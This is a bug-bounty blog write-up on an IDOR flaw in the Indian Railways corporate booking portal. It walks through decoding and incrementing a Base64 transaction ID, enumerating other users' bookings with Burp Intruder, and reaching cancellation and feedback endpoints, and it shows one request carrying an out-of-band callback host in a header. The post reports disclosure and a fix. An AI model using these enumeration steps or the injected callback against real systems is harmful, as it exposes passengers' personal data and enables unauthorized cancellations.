How I Found a Critical IDOR in Indian Railways Corporate Booking Portal Exposing Millions of Users Personal Data
A step-by-step breakdown of how a simple IDOR vulnerability exposed confidential personal details, allowed unauthorized feedback submission and made it possible to cancel flight tickets affecting corporate passengers across India.
coffinxp
coffinxp

Following
9 min read
·
Jul 12, 2025
465


10






Introduction
IRCTC (Indian Railway Catering and Tourism Corporation), established in 1999 under the Ministry of Railways, is the digital backbone of Indian Railways, handling online ticketing, catering and tourism. As of 2025, it serves over 66 million users, processes 730,000+ bookings daily and accounts for 86% of reserved rail tickets. With 8 million daily logins, it’s India’s largest travel platform and the second-busiest globally, serving one of the world’s largest railway networks. In 2024–25, IRCTC generated around $5.5 billion in revenue, making it a major ecommerce player and a key target for both ethical hackers and cyber threats.

What is IDOR?
IDOR (Insecure Direct Object Reference) is a type of security vulnerability that happens when an application allows users to access data or actions by simply changing a value in the URL or request like a user ID or ticket number without proper authorization checks.

For example, if changing user_id=123 to user_id=124 in a URL lets you see someone else’s private information, that’s an IDOR vulnerability.

How I Found This Vulnerability
While testing the corporate IRCTC portal, which handles bulk bookings for government organizations, PSUs and corporate partners (not regular passengers), I came across a critical IDOR (Insecure Direct Object Reference) vulnerability. This flaw gave me full access to millions of users’ private information and allowed unauthorized actions such as:

Complete Flight Ticket Information (Yes, IRCTC also facilitates flight bookings through its corporate portal)
Accessing passport numbers, phone numbers, email id, dob and addresses
Submitting feedback as another user
Canceling someone else’s booked ticket
📝Note: The portal is designed for booking domestic and international flight tickets, offering cheap fares, special offers and minimal service charges. It is especially popular for government employees seeking LTC (Leave Travel Concession) fares and corporate travelers.

Steps to Reproduce
I started by logging into the IRCTC Corporate Booking Portal using a valid corporate account.
After logging in, I navigated to the booking history/transaction details section to view past flight bookings.

3. I then clicked on the “Print” button for one of the bookings, which loaded the full flight ticket information in the browser.



4. In the URL, I noticed a Base64-encoded transactionId parameter. I decoded it using a standard Base64 decoder, which revealed a simple numeric ID (e.g., 4400138432).

5. I modified this numeric ID by incrementing or guessing last four digit and then encoded it back to Base64 and then URL encoded also, and updated the URL and reloaded the page.


6. To my surprise, the portal returned another user’s complete booking details and full travel history without any form of authorization.

Automating the Exploit with Burp Suite
7. I captured this vulnerable request in Burp Suite’s HTTP history and sent it to the Repeater tab.


8. From there, I started manually modifying the transactionId values to random valid-looking numbers and sent the request.

GET /aircorpNewUser/air/bookingconfirmation?transactionId=[id-values] HTTP/1.1
Host: www.corporate.irctc.co.in
Sec-Ch-Ua-Platform: "Windows"
Authorization: Bearer [REDACTED]
Sec-Ch-Ua: "Brave";v="137", "Chromium";v="137", vrqlka46qrbf93homgeywsf3augl4bs0.oastify.com"Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Dnt: 1
Content-Type: application/json
Sec-Gpc: 1
Accept-Language: en;q=0.6
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://www.corporate.irctc.co.in/
Accept-Encoding: gzip, deflate, br
Priority: u=1, i
Connection: keep-alive


Every valid ID returned someone else’s private travel data, proving this was a severe IDOR vulnerability.

9. Once I modified the transactionId in the URL, I was able to view the complete ticket details of other users without any form of authentication or ownership checks. This included highly sensitive data such as:


{
  "status": "SUCCESS",
  "message": "",
  "data": {
    "ticketInfo": [
      {
        "airline": "REDACTED",
        "airlineName": "REDACTED",
        "flightNumber": "REDACTED",
        "origin": "REDACTED",
        "destination": "REDACTED",
        "departureTime": "REDACTED",
        "arrivalTime": "REDACTED",
        "duration": "REDACTED",
        "pnr": "REDACTED",
        "originCity": "REDACTED",
        "destinationCity": "REDACTED",
        "passengers": [
          {
            "firstName": "REDACTED",
            "lastName": "REDACTED",
            "status": "REDACTED",
            "ticketNo": "REDACTED",
            "paxNo": "REDACTED",
            "segmentNo": "REDACTED",
            "oid": "REDACTED",
            "paxType": "REDACTED",
            "age": null,
            "dob": null,
            "title": "REDACTED",
            "ffNumber": "",
            "seatNo": null,
            "seatPrice": null,
            "seatStatus": null,
            "empCode": null
          }
        ],
        "originAirport": "REDACTED",
        "destinationAirport": "REDACTED",
        "tarvelClass": "REDACTED",
        "segmentType": null,
        "segmentNo": "REDACTED",
        "isFreeMeal": true,
        "spPnr": "REDACTED",
        "barcode": null,
        "isSeatEnabled": true
      }
    ],
    "lstIrFbFareDetail": [
      {
        "id": {
          "oid": "REDACTED",
          "passengerNoFare": "REDACTED",
          "segmentNoFare": "REDACTED"
        },
        "airRefundStatus": null,
        "airlineDiscount": 0,
        "airlinePnr": "REDACTED",
        "airlineTransactionFee": null,
        "baseFare": "REDACTED",
        "commission": "REDACTED",
        "fareBasisCode": "REDACTED",
        "fareType": "REDACTED",
        "spPnr": "REDACTED",
        "subTotalFare": "REDACTED",
        "ticketNo": "REDACTED",
        "tktBookingStatusFare": "REDACTED",
        "totalParamsRecieved": "REDACTED",
        "total": "REDACTED",
        "cancelPnr": "REDACTED",
        "retrievePnr": "REDACTED",
        "spCommission": "REDACTED",
        "zoneId": "REDACTED",
        "roId": "REDACTED",
        "gdsNavApiId": "REDACTED"
      }
    ],
    "lstIrFbPassengerDetail": [
      {
        "id": {
          "oid": "REDACTED",
          "passengerNo": "REDACTED"
        },
        "firstName": "REDACTED",
        "lastName": "REDACTED",
        "emailId": "REDACTED",
        "mobileNo": "REDACTED"
      }
    ],
    "lstIrFbFlightDetail": [
      {
        "id": {
          "oid": "REDACTED",
          "segmentsNo": "REDACTED"
        },
        "airline": "REDACTED",
        "airlinePnrNo": "REDACTED",
        "arrivalTime": "REDACTED",
        "cabinClass": "REDACTED",
        "departureTime": "REDACTED",
        "flightNo": "REDACTED",
        "segmentDestination": "REDACTED",
        "segmentOrigin": "REDACTED",
        "spPnrNo": "REDACTED",
        "via": "REDACTED",
        "segmentKey": "REDACTED",
        "spCommission": "REDACTED",
        "operatingAirlineName": "REDACTED",
        "duration": "REDACTED"
      }
    ],
    "lstIrFbExtraInfo": {
      "baggages": [],
      "meals": [],
      "additional": []
    },
    "irFbServiceCharge": {
      "id": 0
    },
    "irFlightsBook": {
      "oid": "REDACTED",
      "airUserAlias": "REDACTED",
      "bookerAddress1": "REDACTED",
      "bookerCity": "REDACTED",
      "bookerCountry": "REDACTED",
      "bookerEmail": "REDACTED",
      "bookerName": "REDACTED",
      "bookerPhone": "REDACTED",
      "bookerPincode": "REDACTED",
      "bookerState": "REDACTED",
      "irFlBookingRefNo": "REDACTED",
      "destination": "REDACTED",
      "origin": "REDACTED",
      "transactionId": "REDACTED",
      "userId": "REDACTED"
    },
    "bookingDate": "REDACTED",
    "irFbTransaction": {
      "oid": "REDACTED",
      "invoiceNo": "REDACTED",
      "bookingRefNo": "REDACTED",
      "ipAddress": "REDACTED",
      "transactionId": "REDACTED",
      "userId": "REDACTED",
      "gstNumber": "REDACTED",
      "gstEmail": "REDACTED",
      "gstCompanyName": "REDACTED",
      "invoiceNoServiceCharge": "REDACTED",
      "qrCodeUrl": "REDACTED",
      "qrCodeServiceCharge": "REDACTED",
      "gstPinCode": "REDACTED",
      "tourCode": "REDACTED"
    },
    "contacts": [
      {
        "name": "REDACTED",
        "code": "REDACTED",
        "web": "REDACTED",
        "cont": "REDACTED"
      }
    ]
  },
  "userDetails": null
}
Scaling the Exploit Using Burp Suite Intruder
9. Manually testing each ID was inefficient, so I sent the same request to Burp Suite’s Intruder for automation. I selected the last 4 digits of the numeric transactionId and configured a payload set ranging from 1111 to 9999.


10. After launching the attack, I observed that a large number of requests returned HTTP 200 responses. Each of these responses corresponded to valid, accessible booking data of different users all being leaked without any authentication or access control in place.



This clearly demonstrates that I was able to access a large number of users booking details without any authentication or authorization checks in place. The issue stems from poor authentication mechanisms and broken access control, allowing any user to retrieve sensitive data simply by manipulating the transactionId.

Flight tickets and personal travel details should be strictly accessible only to their respective owners. However in this case any logged-in user could access the private information of others, posing a serious security and privacy risk. This is a classic example of a Critical IDOR vulnerability that could lead to mass data exposure and regulatory non-compliance.

Unauthorized Ticket Cancellation via IDOR
While exploring the IRCTC Corporate Booking Portal, I identified that the same IDOR vulnerability could potentially be abused to cancel flight tickets booked by other users. By analyzing the cancellation request and observing the use of a Base64-encoded transactionId, it became evident that tampering with this value could allow an attacker to initiate unauthorized cancellation requests even without being the legitimate owner of the ticket.

Although I did not proceed with the actual cancellation, the lack of proper ownership validation clearly indicated a critical access control flaw.

https://www.corporate.irctc.co.in/#/cancellation?transactionId=[id-values]

What’s more alarming is that this action could be performed directly through the website simply by entering someone else’s transactionId. No Burpsuite were required. This presents a serious security flaw affecting any corporate user who has booked a flight ticket.

If abused at scale, this vulnerability could lead to widespread service disruption, internal operational chaos for organizations and even financial loss due to unauthorized ticket cancellations.

Unauthorized Feedback Submission via IDOR
I also discovered another IDOR vulnerability that allowed submitting feedback or comments on behalf of other users. By modifying the userId parameter in the request, it was possible to post feedback tied to another user’s account without their knowledge or consent. This not only violates user integrity but also opens the door to impersonation and misuse of the system.

https://www.corporate.irctc.co.in/#/feedback/[id-values]


As shown in the screenshot, I was able to access another user’s feedback page exposing personal details like phone number, email address, nodal officer info and corporate affiliation. Notably, some accounts belonged to sensitive organizations such as NSG (India’s elite counter-terrorism unit) and Assam Rifles the country’s oldest paramilitary force operating under the Ministry of Home Affairs and and several other armed forces entities. This level of unauthorized access poses a serious national security risk, as it could be abused for impersonation, misinformation or reputational harm.

An Attacker Could Easily Exploit the Feedback Feature To:
Defame the IRCTC system.
Create audit problems.
Trigger internal reviews or flags from fake negative feedback.
Blind XSS Testing in the Feedback Feature
While testing the feedback form, I noticed input fields such as name, designation and suggestions that accept user-submitted content. I injected several Blind XSS payloads into these fields and observed that input validation or sanitization was missing.

If these inputs are rendered in a backend admin panel or internal dashboard without proper sanitization, they could potentially trigger Blind XSS in an internal context granting access to the admin interface or session data and significantly escalating the severity of the vulnerability.


Mitigation: How Developers Can Prevent This
To mitigate this vulnerability and prevent similar issues in the future, I recommended the following:

Enforce Authorization Checks: Every resource must validate whether the requester owns or has permission to access the data.
Token-Based Access: Tie user sessions and resources with time-bound and organization-bound tokens.
Rate-Limiting & Monitoring: Detect brute-force attempts to enumerate IDs.
Audit Logs: Maintain logs to identify unauthorized access attempts historically.
Timeline & Responsible Disclosure
I responsibly reported this issue through the appropriate security channel with all PoC details, screenshots and impact breakdown.

Timeline:
Date of Discovery & reported: June 26, 2025
A ticket was assigned: June 27, 2025
Fix Implemented & Acknowledgment: July 11, 2025

Conclusion
This vulnerability highlights why IDOR remains one of the most common and dangerous flaws, especially on platforms like IRCTC that handle massive bookings and sensitive data. Just one overlooked endpoint can expose millions. I hope this discovery motivates others in the security space to explore IDORs more deeply, they might seem simple, but their impact can be massive.

Upnext: If you found this helpful, you’ll definitely want to check out my article The Dark Side of Swagger UI: How XSS and HTML Injection Can Compromise APIs. It reveals how overlooked UI flaws can lead to serious API-level attacks 👇

The Dark Side of Swagger UI: How XSS and HTML Injection Can Compromise APIs
Mass Hunting Swagger API Vulnerabilities Like a Pro
infosecwriteups.com

Connect with Me
If you enjoyed this article and want to stay updated with more content on bug bounty and cybersecurity follow me on:
Twitter (X): @coffinxp7 | GitHub coffinxp | Website: lostsec.xyz | YouTube: Lostsec | Discord Lostsec

Disclaimer
The content provided in this article is for educational and informational purposes only. Always ensure you have proper authorization before conducting security assessments. Use this information responsibly
